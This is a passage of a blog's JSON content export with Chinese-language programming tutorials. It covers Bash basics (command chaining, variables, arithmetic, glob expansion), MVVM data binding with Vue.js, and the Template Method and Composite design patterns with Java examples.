filelist.txt ; ls -l filelist.txt 上面例子中，只要cat命令执行结束，不管成功或失败，都会继续执行ls命令。 1$ cat filelist.txt &amp;&amp; ls -l filelist.txt 上面例子中，只有cat命令执行成功，才会继续执行ls命令。如果cat执行失败（比如不存在文件flielist.txt），那么ls命令就不会执行。 1$ mkdir foo || mkdir bar 上面例子中，只有mkdir foo命令执行失败（比如foo目录已经存在），才会继续执行mkdir bar命令。如果mkdir foo命令执行成功，就不会创建bar目录了。 1 变量1.1 变量类型几乎所有的编程语言都有变量的概念，Bash当然也不例外。说道变量就少不了说一说类型。但与其他语言不同的是Bash属于无类型语言，如果强要说一种类型，可以认为都是字符串。说到这里，你可能会说，Bash里面也有整数类型吧，好像有整数的运算。但其是通过一些运算符，表达式或者命令将字符串视作整数处理的，其本质还是字符串。 1.2 声明变量Bash中的变量和其他脚本语言一样，都是无需声明，直接拿来用的。所以变量的第一次出现都是伴随着初始化的。 1.3 取用变量变量前加一个 $ 符号。称作dollar符，就是美元符号。这是最基本的一种取用方式，其他的方式以后再表。 12a=\"hello world\" echo $a 终端会打印出 hello world。当然你可以把变量和常量字符串放到一起来打印，比如 12boy=Jellyecho &quot;$boy:hello world!&quot; 结果为 Jelly:hello world! 1.4 初始化/赋值变量Bash中的变量由于无需声明，所以第一次出现都会伴随初始化。Bash中的变初始化（或赋值）方式共有三种：直接赋值、读取输入和命令替换。 1.4.1 直接赋值直接赋值就是使用一个等于号了，这在其他编程语言里也很常见，比如： 1234a=123b=abcc=‘123’d=“hello world” 注意空格需要注意的是等号左右不能有空格！！！比如如果出现a = 22，执行该.sh时则会直接报错 关于引号其次要理解的是，由于刚才说过的所有变量都可视作字符串，所以其实a=123和a=“123”没什么不同。不过如果你的变量包含空格就一定需要用引号来包裹了。 单引号和双引号一般情况下作用相同，除了某些特殊情况： 1234a=\"I'm Jelly\"b='Jelly:\"Hi\"'echo $aecho $b 当字符串中含有单引号那么外面要用双引号，反之亦然。 1.4.2 读取输入读取终端的输入给变量赋值，就是使用read命令。read和echo一样都是内嵌命令。直接看代码： 123echo -n \"Please Input your name:\"read nameecho \"Hi,$name,welcome to uncle Jelly's cabin!\" 或者可以使用read命令的 -p 选项来简化上述代码： 12read -p \"Please Input your name:\" nameecho \"$name,welcome to uncle jelly's cabin!\" 1.4.3 命令替换这是非常实用的一种初始化或赋值的方式。利用其他命令的输出来给一个变量赋值。这需要用到反引用符号(“`”) 1234dir=`pwd`tim=`date`echo \"我在$dir目录下\"echo \"现在时间是$time\" 这里调用了pwd和date两个命令。你可以直接在终端键入这两个命令，看看打印结果。反引号就是把``中命令中的输出赋值给变量。 注意使用反引号进行命令替换赋值，且直接打印该变量时，变量中的\\n换行符会被替换成空格： 12345ps1=`ps`echo $ps1ps2=`ps`echo \"$ps2\" 除此之外，也可以通过$()的方式进行命令替换赋值： 1234dir=$(dir)tim=$(date)echo \"$dir\"echo \"$tim\" Note: 修改shell脚本权限或执行shell脚本的时候，在shell脚本名前加./，即当前目录下查找，否则会在PATH下开始查找，避免不必要的麻烦 当shell脚本执行过程中发现shell脚本存在错误时（比如使用了一个未定义的变量），该错误代码会被跳过，并且继续执行错误代码之后的所有代码（而不是立刻执行当前shell脚本的执行） 2 数值计算前面提到，Bash把所有变量都视为字符串。比如，a=1+2，$a并不等于3，而是等于字符串1+2。因此Bash中的数学计算并不如其他语言那样简便。 运算符[]为了解决这个问题，我们可以使用运算符[]。 在中括号中引用变量可以直接使用变量名，也可以使用$加变量名 1234567891011a=2b=3c1=$[$a+4]echo $c1c2=$[a+5]echo $c2c3=$[$a+$b]echo $c3 expr及其反引用1234567a=2b=3expr $a + $bexpr $a - $bexpr $a \\* $bexpr $a / $bexpr $a % $b 需要注意的是： 操作符和操作数之间一定要有空格间隔 操作数（即变量）前必须有$符 乘号*，要用反斜杠\\进行转义 该命令会将计算结果打印到标准输出 仅支持整数运算 也可以直接使用数字的字面值 将expr的计算结果赋值给一个变量呢： 1c=`expr $a + $b` 3 Bash 的模式扩展? 字符扩展?字符代表文件路径里面的任意单个字符，不包括空字符。比如，Data???匹配所有Data后面跟着三个字符的文件名。 123# 存在文件 a.txt 和 b.txt$ ls ?.txta.txt b.txt 上面命令中，?表示单个字符，所以会同时匹配a.txt和b.txt。 如果匹配多个字符，就需要多个?连用。 123# 存在文件 a.txt、b.txt 和 ab.txt$ ls ??.txtab.txt 上面命令中，??匹配了两个字符。 ? 字符扩展属于文件名扩展，只有文件确实存在的前提下，才会发生扩展。如果文件不存在，扩展就不会发生。 1234567# 当前目录有 a.txt 文件$ echo ?.txta.txt# 当前目录为空目录$ echo ?.txt?.txt 上面例子中，如果?.txt可以扩展成文件名，echo命令会输出扩展后的结果；如果不能扩展成文件名，echo就会原样输出?.txt。 * 字符扩展*字符代表文件路径里面的任意数量的字符，包括零个字符。 123456# 存在文件 a.txt、b.txt 和 ab.txt$ ls *.txta.txt b.txt ab.txt# 输出所有文件$ ls * 下面是*匹配空字符的例子。 123456# 存在文件 a.txt、b.txt 和 ab.txt$ ls a*.txta.txt ab.txt$ ls *b*b.txt ab.txt 注意，*不会匹配隐藏文件（以.开头的文件）。 123456# 显示所有隐藏文件$ echo .*# 与方括号扩展结合使用，# 只显示正常的隐藏文件，不显示 . 和 .. 这两个特殊文件$ echo .[!.]* *字符扩展也属于文件名扩展，只有文件确实存在的前提下才会扩展。如果文件不存在，就会原样输出。 123# 当前目录不存在 c 开头的文件$ echo c*.txtc*.txt 上面例子中，当前目录里面没有c开头的文件，导致c*.txt会原样输出。 *只匹配当前目录，不会匹配子目录。 123456# 子目录有一个 a.txt# 无效的写法$ ls *.txt# 有效的写法$ ls */*.txt 上面的例子，文本文件在子目录，*.txt不会产生匹配，必须写成*/*.txt。有几层子目录，就必须写几层星号。 Bash 4.0 引入了一个参数globstar，当该参数打开时，允许**匹配零个或多个子目录。因此，**/*.txt可以匹配顶层的文本文件和任意深度子目录的文本文件。详细介绍请看后面shopt命令的介绍。 Reference https://blog.csdn.net/guodongxiaren/article/details/38402577 https://blog.csdn.net/huangchunxia_1/article/details/79649481 https://blog.csdn.net/guodongxiaren/article/details/39544805 https://blog.csdn.net/column/details/wanbash.html https://wangdoc.com/bash/grammar.html","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Architectural Pattern】MVVM与数据绑定","date":"2018-11-12T01:31:41.000Z","path":"2018/11/12/【Architectural-Pattern】MVVM与数据绑定/","text":"0 概念MVVM （Model - View - ViewModel）最早由微软提出，它在MVC的基础之上，增加了数据绑定机制。 数据绑定（Data Binding）是一个实现UI中显示内容与数据对象（data object）相互关联的机制，它使得数据对象中的数据变化能够自动更新同步对应的UI显示内容中。反过来，也可以将用户在UI显示内容中进行的修改自动更新同步到数据对象（data object）中。 数据流方向单向绑定（One-Way Data Binding） 当数据源更新时，这个变化会自动同步到目标对象中。而对于目标对象的变化，并不会被同步到数据源中。 目标对象可以为UI中的数据，则当数据源中的数据变化时，UI界面上的对应数据就会自动更新。 双向绑定（Two-Way Data Binding）除了数据源的更新可以自动同步到目标对象之外，当对于目标对象的变化，也会自动同步到数据源中。因此我们将其称之为双向绑定。 当目标对象为UI中的数据时，用户在界面上进行的修改就能自动更新到数据源中。 提供数据绑定的框架 C# Windows Presentation Foundation JavaScript AngularJS Backbone.js React Vue.js 借助MVVM框架，可以帮助我们实现单向或双向的数据绑定。 下面，我们分别引用一个基于前端页面的MVVM框架（Vue.js）和基于客户端-服务器（Client-Server）的桌面级MVVM框架（Microsoft Windows Presentation Foundation），以帮助我们更好的理解数据绑定与 MVVM。 1 例子1 - 基于前端页面的MVVM框架（Vue.js）若在前端页面应用 MVVM，Model可用纯JavaScript对象表示，View负责数据在页面上的显示，ViewModel则负责将Model中的数据同步到View显示出来，同时，当用户在View中修改了数据后，ViewModel还需要将View中修改后的数据同步到Model中。 1.1 单向绑定（One-Way Data Binding）1.1.1 JQuery修改DOM我们先介绍一个JQuery实现的修改两个DOM元素的例子，以帮助我们更好地引入单向绑定。 我们有一个包含以下HTML的页面：12&lt;p&gt;Hello, &lt;span id=\"name\"&gt;Bart&lt;/span&gt;!&lt;/p&gt;&lt;p&gt;You are &lt;span id=\"age\"&gt;12&lt;/span&gt;.&lt;/p&gt; 页面显示：12Hello, Bart!You are 12. 用JQuery修改name和age节点中显示的内容：12345678var person = &#123; name: 'Homer', age: 51&#125;;// JQuery code$('#name').text(person.name);$('#age').text(person.age); 当以上 JQuery 代码执行后，页面的内容应该发生了变化，变为： 12Hello, Homer!You are 15. 分析： 我们定义了person对象，以定义数据源（对应于Model） 通过JQuery代码实现将Model中的数据同步到页面（对应View）中 1.1.2 应用前端MVVM框架当我们应用了前端 MVVM 框架后（这里以Vue.js为例），我们只需要关注于 Model 中的数据，而 MVVM 框架本身会自动将 Model 中的数据变化映射到 DOM中（对应上面的JQuery操作）。这样的自动映射使得前端开发者不再需要通过手动修改DOM而实现数据的显示更新。 从而，在处理包含用户输入交互较多的“富表单型”应用时，MVVM框架本身可以为我们简化大量业务无关的代码。 基于Vue.js实现的单向绑定：123456789101112131415161718192021222324252627282930&lt;html&gt;&lt;head&gt;&lt;!-- 引用jQuery --&gt;&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js\"&gt;&lt;/script&gt;&lt;!-- 引用Vue --&gt;&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.15/vue.js\"&gt;&lt;/script&gt;&lt;script&gt;// 初始化代码:$(function () &#123; var vm = new Vue(&#123; el: '#vm', data: &#123; name: 'Robot', age: 15 &#125; &#125;); window.vm = vm;&#125;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"vm\"&gt; &lt;p&gt;Hello, &#123;&#123; name &#125;&#125;!&lt;/p&gt; &lt;p&gt;You are &#123;&#123; age &#125;&#125; years old!&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;html&gt; 在VM的核心代码中： 1234567var vm = new Vue(&#123; el: '#vm', data: &#123; name: 'Robot', age: 15 &#125;&#125;); 解析：el属性指定了要把Model绑定到哪个DOM节点上，语法类似JQuery（这里的#vm对应了ID为vm的DOM节点，即&lt;div id=&quot;vm&quot;&gt;...&lt;/div&gt;）。 data属性指向了Model，它是一个JavaScript对象。 在&lt;div id=&quot;vm&quot;&gt;...&lt;/div&gt;中，使用可以直接引用Model中某个属性（这里对应于data对象中的name属性）。 操作：我们在浏览器中打开这个HTML页面，则会看到： 12Hello, Robot!You are 15 years old! 如果，在该页面上，使用Chrome并打开Developer Tools中的Console，执行： 1window.vm.name = &apos;Bob&apos; 在执行完成后，会观察到页面立刻发生了变化，原来的Hello, Robot!变成了Hello, Bob!。 事实上，我们在之前执行了window.vm = vm，即把ViewModel绑定到了window对象上。当我们修改ViewModel对应的Model时，MVVM框架（这里对应Vue.js）会自动监听Model的任何变化，并将变化后的Model数据更新到View的显示中。 这样只从Model到View的绑定称为单向绑定（One-Way Data Binding）。 1.2 双向绑定（Two-Way Data Binding）在单向绑定中，仅把Model绑定到View上，即当Model中的数据更新时，View中显示的数据也会自动被更新。 而如果当用户在UI中将View中的数据更新了，Model也能自动更新。就称为双向绑定（Two-Way Data Binding）。 什么情况下，用户才能更新View中的数据呢？填写表单就是一个最直接的例子。 当用户填写表单（Form）时，View中的数据就被更新了。如果MVVM框架能够将更新自动同步到对应的Model中，我们就称这里的View和Model做了双向绑定。 仍以Vue.js作为MVVM前端框架为例：123456789101112131415161718192021222324252627282930&lt;html&gt;&lt;head&gt;&lt;!-- 引用jQuery --&gt;&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js\"&gt;&lt;/script&gt;&lt;!-- 引用Vue --&gt;&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.15/vue.js\"&gt;&lt;/script&gt;&lt;script&gt;// 初始化代码:$(function () &#123; var vm = new Vue(&#123; el: '#vm', data: &#123; name: 'Robot', email: 'a@b.com' &#125; &#125;); window.vm = vm;&#125;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;form id=\"vm\" action=\"#\"&gt; &lt;p&gt;&lt;input v-model=\"name\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input v-model=\"email\"&gt;&lt;/p&gt; &lt;/form&gt;&lt;/body&gt;&lt;html&gt; 解析： 我们添加了一个HTML Form表单&lt;form id=&quot;vm&quot; action=&quot;#&quot;&gt;...&lt;/form&gt; 用v-model将某个&lt;input&gt;标签与Model的某个属性作了双向绑定 操作： 在表单中输入内容（a@example.com 和 Tom） 通过执行window.vm.name = &quot;John&quot;，以在Console中修改Model中name的值 分别在每次操作前后，在Chrome Developer Tools的Console中，执行window.vm.$data以对比Model的变化 这说明，View和Model中任何一方的变化都能自动被更新另一方，即View与Model作了双向绑定。 2 例子2 - 桌面级MVVM框架（Microsoft Windows Presentation Foundation）基本的数据绑定概念 …待补充 Reference Wikipedia - Data binding 廖雪峰 - MVVM Microsoft - WPF Data binding Overview NativeScript - Data Binding","comments":true,"categories":[{"name":"ArchitecturalPattern","slug":"ArchitecturalPattern","permalink":"http://swsmile.info/categories/ArchitecturalPattern/"}],"tags":[{"name":"Architectural Pattern","slug":"Architectural-Pattern","permalink":"http://swsmile.info/tags/Architectural-Pattern/"}]},{"title":"【Design Pattern】结构类模式 -- 模板方法模式 (Template Method Pattern)","date":"2018-11-12T01:27:31.000Z","path":"2018/11/12/【Design-Pattern】结构类模式-模板方法模式-Template-Method-Pattern/","text":"1 动机2 定义在阎宏博士的《Java与模式》一书中开头是这样描述模板方法（Template Method）模式的： 模板方法模式是类的行为模式。准备一个抽象类，将部分逻辑以具体方法以及具体构造函数的形式实现，然后声明一些抽象方法来迫使子类实现剩余的逻辑。不同的子类可以以不同的方式实现这些抽象方法，从而对剩余的逻辑有不同的实现。这就是模板方法模式的用意。 模板方法模式是基于继承的代码复用基本思想，模板方法模式的结构和用法也是面向对象设计的核心之一。在模板方法模式中，可以将相同的代码放在父类中，而将不同的方法实现放在不同的子类中。 在模板方法模式中，我们需要准备一个抽象类，将部分逻辑以具体方法以及具体构造函数的形式实现，然后声明一些抽象方法来让子类实现剩余的逻辑。不同的子类可以以不同的方式实现这些抽象方法，从而对剩余的逻辑有不同的实现，这就是模板方法模式的用意。模板方法模式体现了面向对象的诸多重要思想，是一种使用频率较高的模式。 3 构成UML图 构成 抽象模板类（AbstractClass）: 定义了抽象的原语方法（primitive method） ，以便让子类具体来实现这些原语方法； 具体实现一个模板方法（template method），在这个模板方法中定义了对应算法的骨架。该模板方法调用所有的原语方法； 具体模板类 （ConcreteClass）: 实现父类中定义的抽象原语方法，以完成算法中与特定子类相关的步骤。 示范抽象模板角色类抽象模板角色类，abstractMethod()、hookMethod()等基本方法是顶级逻辑的组成步骤，这个顶级逻辑由templateMethod()方法代表。 12345678910111213141516171819202122232425public abstract class AbstractTemplate &#123; /** * 模板方法 */ public void templateMethod()&#123; //调用基本方法 abstractMethod(); hookMethod(); concreteMethod(); &#125; /** * 基本方法的声明（由子类实现） */ protected abstract void abstractMethod(); /** * 基本方法(空方法) */ protected void hookMethod()&#123;&#125; /** * 基本方法（已经实现） */ private final void concreteMethod()&#123; //业务相关的代码 &#125;&#125; 具体模板角色类具体模板角色类，实现了父类所声明的基本方法，abstractMethod()方法所代表的就是强制子类实现的剩余逻辑，而hookMethod()方法是可选择实现的逻辑，不是必须实现的。 123456789101112public class ConcreteTemplate extends AbstractTemplate&#123; //基本方法的实现 @Override public void abstractMethod() &#123; //业务相关的代码 &#125; //重写父类的方法 @Override public void hookMethod() &#123; //业务相关的代码 &#125;&#125; 4 示例背景假设我们作为一个建筑公司，需要设计一个方案来实现建造不同的房子，我们可能会建造木房子或玻璃房子。 我们可以定义一个抽象类HouseTemplate表示建造任何类型房子，木房子建造类WoodenHouse和玻璃房子建造类GlassHouse均实现了HouseTemplate抽象类。 建造房子的步骤包括： 修建地基（buildFoundation()） 修建柱子（buildPillars()） 修建墙面（buildWalls()） 安装窗（buildWindows()） Note：以上每个步骤都对应一个特定的方法。 显然，我们不能任意颠倒以上步骤的顺序（比如，在修建地基之前就安装窗）。因此，我们通过定义一个buildHouse()模板方法（template method）来指定建造步骤的执行顺序。 Note：buildHouse()方法不能被子类改写（因为，即使是建造不同类型的房子，建房的四大核心步骤的顺序也是相同的） 同时，无论建造什么房子（木房子或玻璃房子），我们打地基的方式可能都是一样的。所以，我们可以在抽象类HouseTemplate中，用最常用的打地基方式来实现buildFoundation()。如果在建造一个特殊类型的房子时，需要用一个特殊的方法来打地基。则可以在房子子类中重写（override）buildFoundation()方法。 假设我们认为对于不同类型的房子，修建柱子和修建墙面是没有统一的方法的。我们将buildPillars()和buildWalls()定义为抽象方法（abstract），以让子类显式地去实现。 实现HouseTemplate 房子建造抽象类123456789101112131415161718192021222324public abstract class HouseTemplate &#123; //template method defining the order of execution for performing several steps, final so subclasses can't override public final void buildHouse()&#123; buildFoundation(); buildPillars(); buildWalls(); buildWindows(); System.out.println(\"House is built.\"); &#125; public void buildWindows() &#123; System.out.println(\"Building Glass Windows\"); &#125; //default implementation public void buildFoundation() &#123; System.out.println(\"Building foundation with cement,iron rods and sand\"); &#125; //methods to be implemented by subclasses public abstract void buildWalls(); public abstract void buildPillars();&#125; WoodenHouse 木房子建造类12345678910111213public class WoodenHouse extends HouseTemplate &#123; @Override public void buildWalls() &#123; System.out.println(\"Building Wooden Walls\"); &#125; @Override public void buildPillars() &#123; System.out.println(\"Building Pillars with Wood coating\"); &#125;&#125; GlassHouse玻璃房子建造类12345678910111213public class GlassHouse extends HouseTemplate &#123; @Override public void buildWalls() &#123; System.out.println(\"Building Glass Walls\"); &#125; @Override public void buildPillars() &#123; System.out.println(\"Building Pillars with glass coating\"); &#125;&#125; 调用123456789101112public class HousingClient &#123; public static void main(String[] args) &#123; HouseTemplate houseType = new WoodenHouse(); //using template method houseType.buildHouse(); System.out.println(\"************\"); houseType = new GlassHouse(); houseType.buildHouse(); &#125;&#125; 问题引入如果有一天，有一个客户希望他的房子是没有窗的，那怎么办呢？ 我们可以从容地在HouseTemplate抽象类中，添加一个hook 方法hasWindows()，且默认返回true。且简单修改一下模板方法： 123456789101112131415public boolean hasWindows()&#123; return true;&#125;//template method public final void buildHouse()&#123; buildFoundation(); buildPillars(); buildWalls(); if (hasWindows())&#123; buildWindows(); &#125; System.out.println(\"House is built.\");&#125; 当不需要窗时，只需要在子类中重写hasWindows()方法，并将返回值修改为false即可。 5 适用场景 模板方法中定义一个操作或行为的内部逻辑执行顺序，这个操作无论在什么样的执行环境中执行，其内部执行顺序均不会改变 抽象类中定义了一些操作的默认实现（显然，子类可以在需要的时候重写这些操作） 6 模式应用模板方法模式在Servlet中的应用使用过Servlet的人都清楚，除了要在web.xml做相应的配置外，还需继承一个叫HttpServlet的抽象类。 HttpService类提供了一个service()方法，这个方法调用七个do方法中的一个或几个，完成对客户端调用的响应。 这些do方法需要由HttpServlet的具体子类提供，这是典型的模板方法模式。 下面是service()方法的源代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; String method = req.getMethod(); if (method.equals(METHOD_GET)) &#123; long lastModified = getLastModified(req); if (lastModified == -1) &#123; // servlet doesn't support if-modified-since, no reason // to go through further expensive logic doGet(req, resp); &#125; else &#123; long ifModifiedSince = req.getDateHeader(HEADER_IFMODSINCE); if (ifModifiedSince &lt; (lastModified / 1000 * 1000)) &#123; // If the servlet mod time is later, call doGet() // Round down to the nearest second for a proper compare // A ifModifiedSince of -1 will always be less maybeSetLastModified(resp, lastModified); doGet(req, resp); &#125; else &#123; resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); &#125; &#125; &#125; else if (method.equals(METHOD_HEAD)) &#123; long lastModified = getLastModified(req); maybeSetLastModified(resp, lastModified); doHead(req, resp); &#125; else if (method.equals(METHOD_POST)) &#123; doPost(req, resp); &#125; else if (method.equals(METHOD_PUT)) &#123; doPut(req, resp); &#125; else if (method.equals(METHOD_DELETE)) &#123; doDelete(req, resp); &#125; else if (method.equals(METHOD_OPTIONS)) &#123; doOptions(req,resp); &#125; else if (method.equals(METHOD_TRACE)) &#123; doTrace(req,resp); &#125; else &#123; // // Note that this means NO servlet supports whatever // method was requested, anywhere on this server. // String errMsg = lStrings.getString(\"http.method_not_implemented\"); Object[] errArgs = new Object[1]; errArgs[0] = method; errMsg = MessageFormat.format(errMsg, errArgs); resp.sendError(HttpServletResponse.SC_NOT_IMPLEMENTED, errMsg); &#125;&#125; 当然，这个service()方法也可以被子类置换掉。 下面给出一个简单的Servlet例子： 从上面的类图可以看出，TestServlet类是HttpServlet类的子类，并且置换掉了父类的两个方法：doGet()和doPost()。 12345678910111213141516public class TestServlet extends HttpServlet &#123; public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; System.out.println(\"using the GET method\"); &#125; public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; System.out.println(\"using the POST method\"); &#125;&#125; 分析从上面的例子可以看出这是一个典型的模板方法模式。 HttpServlet担任抽象模板角色 模板方法：由service()方法担任。 基本方法：由doPost()、doGet()等方法担任。 TestServlet担任具体模板角色 TestServlet置换掉了父类HttpServlet中七个基本方法中的其中两个，分别是doGet()和doPost()。 Reference 《Java与模式》 Journaldev - Template Method - https://www.journaldev.com/1763/template-method-design-pattern-in-java 模板方法模式（Template Method） - 最易懂的设计模式解析 - https://blog.csdn.net/carson_ho/article/details/54910518 《JAVA与模式》之模板方法模式 - https://www.cnblogs.com/java-my-life/archive/2012/05/14/2495235.html","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Design Pattern】结构类模式 -- 组合模式 (Composite Pattern)","date":"2018-11-12T01:26:17.000Z","path":"2018/11/12/【Design-Pattern】结构类模式-组合模式-Composite-Pattern/","text":"动机 希望表达具有层次结构（部分-整体，part-whole）的实体 对调用者来说，叶子元素和复合元素都是一样的 定义组合模式（Composite pattern）通常用于表达具有层次结构（part-whole）的类。 注意，这里的层次结构不一定是树状结构，也可能是简单一个集合。 构成 抽象构件角色（Component）：是这个具有层次结构的类中的基本单元，可以是接口或抽象类。这个角色给出共有接口及其默认行为。 树叶构件角色（Leaf）：位于层级结构中底部的元素，实现了基本元素（Base Component） 树枝构件角色（Composite）：由叶子元素组成，实现了基本元素（Base Component） 对调用者来说，叶子元素和复合元素都是一样的，或者说，调用者可以将树叶构件角色和树枝构件角色都看做是基本元素（Component）。 当形成树状结构时，他们的关系可以呈以下结构： UML图 讨论组合模式的实现根据所实现接口的区别分为两种形式，分别称为安全模式和透明模式。组合模式可以不提供父对象的管理方法，但组合模式必须在合适的地方提供子对象的管理方法（诸如：add()、remove()、getChild()等）。 透明方式作为第一种选择，在Component里面声明所有的用来管理子类对象的方法，包括add()、remove()，以及getChild()方法。 这样做的好处是所有的构件类都有相同的接口。在客户端看来，树叶类对象与合成类对象的区别起码在接口层次上消失了，客户端可以同等同的对待所有的对象。这 就是透明形式的组合模式。 这个选择的缺点是不够安全，因为树叶类对象和合成类对象在本质上是有区别的。树叶类对象不可能有下一个层次的对象，因此add()、remove()以及getChild()方法没有意义，是在编译时期不会出错，而只会在运行时期才会出错。 安全方式第二种选择是在Composite类里面声明所有的用来管理子类对象的方法。这样的做法是安全的做法，因为树叶类型的对象根本就没有管理子类对象的方法，因此，如果客户端对树叶类对象使用这些方法时，程序会在编译时期出错。 这个选择的缺点是不够透明，因为树叶类和合成类将具有不同的接口。 这两个形式各有优缺点，需要根据软件的具体情况做出取舍决定。 例子1UML图 实现思路基本元素（Base Component）- Shape.java123public interface Shape &#123; public void draw(String fillColor);&#125; 叶子元素（Leaf）- Triangle.java1234567public class Triangle implements Shape &#123; @Override public void draw(String fillColor) &#123; System.out.println(\"Drawing Triangle with color \"+fillColor); &#125;&#125; 叶子元素（Leaf）- Circle.java12345678public class Circle implements Shape &#123; @Override public void draw(String fillColor) &#123; System.out.println(\"Drawing Circle with color \"+fillColor); &#125;&#125; 树枝元素（Composite）- Drawing.java1234567891011121314151617181920212223242526272829303132import java.util.ArrayList;import java.util.List;public class Drawing implements Shape&#123; //collection of Shapes private List&lt;Shape&gt; shapes = new ArrayList&lt;Shape&gt;(); @Override public void draw(String fillColor) &#123; for(Shape sh : shapes) &#123; sh.draw(fillColor); &#125; &#125; //adding shape to drawing public void add(Shape s)&#123; this.shapes.add(s); &#125; //removing shape from drawing public void remove(Shape s)&#123; shapes.remove(s); &#125; //removing all the shapes public void clear()&#123; System.out.println(\"Clearing all the shapes from drawing\"); this.shapes.clear(); &#125;&#125; 调用者代码 - TestCompositePattern.java12345678910111213141516171819202122232425262728293031public class TestCompositePattern &#123; public static void main(String[] args) &#123; // Draw a atomic shape (Triangle) Shape tri0 = new Triangle(); tri0.draw(\"Blue\"); // Draw a atomic shape (Circle) Shape cir0 = new Circle(); cir0.draw(\"White\"); // Draw a composite shape (2 Triangles and 1 Circle) Shape tri = new Triangle(); Shape tri1 = new Triangle(); Shape cir = new Circle(); Shape drawing = new Drawing(); drawing.add(tri1); drawing.add(tri1); drawing.add(cir); drawing.draw(\"Red\"); drawing.clear(); drawing.add(tri); drawing.add(cir); drawing.draw(\"Green\"); &#125;&#125; 例子2基本元素（Base Component）- LetterComposite.java123456789101112131415161718public abstract class LetterComposite &#123; private List&lt;LetterComposite&gt; children = new ArrayList&lt;&gt;(); public void add(LetterComposite letter) &#123; children.add(letter); &#125; public int count() &#123; return children.size(); &#125; protected void printThisBefore() &#123;&#125; protected void printThisAfter() &#123;&#125; public void print() &#123; printThisBefore(); for (LetterComposite letter : children) &#123; letter.print(); &#125; printThisAfter(); &#125;&#125; 叶子元素（Leaf）- Letter.java12345678910public class Letter extends LetterComposite &#123; private char c; public Letter(char c) &#123; this.c = c; &#125; @Override protected void printThisBefore() &#123; System.out.print(c); &#125;&#125; 树枝元素（Composite）- Word.java1234567891011public class Word extends LetterComposite &#123; public Word(List&lt;Letter&gt; letters) &#123; for (Letter l : letters) &#123; this.add(l); &#125; &#125; @Override protected void printThisBefore() &#123; System.out.print(\" \"); &#125;&#125; 树枝元素（Composite）- Sentence.java1234567891011public class Sentence extends LetterComposite &#123; public Sentence(List&lt;Word&gt; words) &#123; for (Word w : words) &#123; this.add(w); &#125; &#125; @Override protected void printThisAfter() &#123; System.out.print(\".\"); &#125;&#125; 辅助调用类1234567891011121314151617181920212223242526public class Messenger &#123; LetterComposite messageFromOrcs() &#123; List&lt;Word&gt; words = new ArrayList&lt;&gt;(); words.add(new Word(Arrays.asList(new Letter('W'), new Letter('h'), new Letter('e'), new Letter('r'), new Letter('e')))); words.add(new Word(Arrays.asList(new Letter('t'), new Letter('h'), new Letter('e'), new Letter('r'), new Letter('e')))); words.add(new Word(Arrays.asList(new Letter('i'), new Letter('s')))); words.add(new Word(Arrays.asList(new Letter('a')))); words.add(new Word(Arrays.asList(new Letter('w'), new Letter('h'), new Letter('i'), new Letter('p')))); words.add(new Word(Arrays.asList(new Letter('t'), new Letter('h'), new Letter('e'), new Letter('r'), new Letter('e')))); words.add(new Word(Arrays.asList(new Letter('i'), new Letter('s')))); words.add(new Word(Arrays.asList(new Letter('a')))); words.add(new Word(Arrays.asList(new Letter('w'), new Letter('a'), new Letter('y')))); return new Sentence(words); &#125; LetterComposite messageFromElves() &#123; List&lt;Word&gt; words = new ArrayList&lt;&gt;(); words.add(new Word(Arrays.asList(new Letter('M'), new Letter('u'), new Letter('c'), new Letter('h')))); words.add(new Word(Arrays.asList(new Letter('w'), new Letter('i'), new Letter('n'), new Letter('d')))); words.add(new Word(Arrays.asList(new Letter('p'), new Letter('o'), new Letter('u'), new Letter('r'), new Letter('s')))); words.add(new Word(Arrays.asList(new Letter('f'), new Letter('r'), new Letter('o'), new Letter('m')))); words.add(new Word(Arrays.asList(new Letter('y'), new Letter('o'), new Letter('u'), new Letter('r')))); words.add(new Word(Arrays.asList(new Letter('m'), new Letter('o'), new Letter('u'), new Letter('t'), new Letter('h')))); return new Sentence(words); &#125;&#125; 调用1234LetterComposite orcMessage = new Messenger().messageFromOrcs();orcMessage.print(); // Where there is a whip there is a way.LetterComposite elfMessage = new Messenger().messageFromElves();elfMessage.print(); // Much wind pours from your mouth. 优缺点优点待补充 缺点待补充 适用场景 希望表达一个具有层次结构的类（part-whole hierarchies of related objects），如包含多个部分且包含不同题目类型的一份考试题目，包含多个部分（section）和多种不同的题目类型（选择题、问答题等） 复合对象和原子对象对于调用者来说，都是一样的对象，如复合题目（包含多道题目），和一个单选题目，对于调用者来说都是题目对象 应用Java AWT中* java.awt.Container and java.awt.Component。 在Java AWT中，Component类是抽象构件，Checkbox、Button和TextComponent是叶子构件，而Container是容器构件（当然，在AWT中包含的叶子构件还有很多）。 在一个容器构件中可以包含叶子构件，也可以继续包含容器构件，这些叶子构件和容器构件一起组成了复杂的GUI界面。 Reference 《Design Patterns: Elements of Reusable Object-Oriented Software》 《Java与模式》 Journaldev – Composite Design Pattern in Java - https://www.journaldev.com/1535/composite-design-pattern-in-java https://github.com/iluwatar/java-design-patterns/tree/master/composite 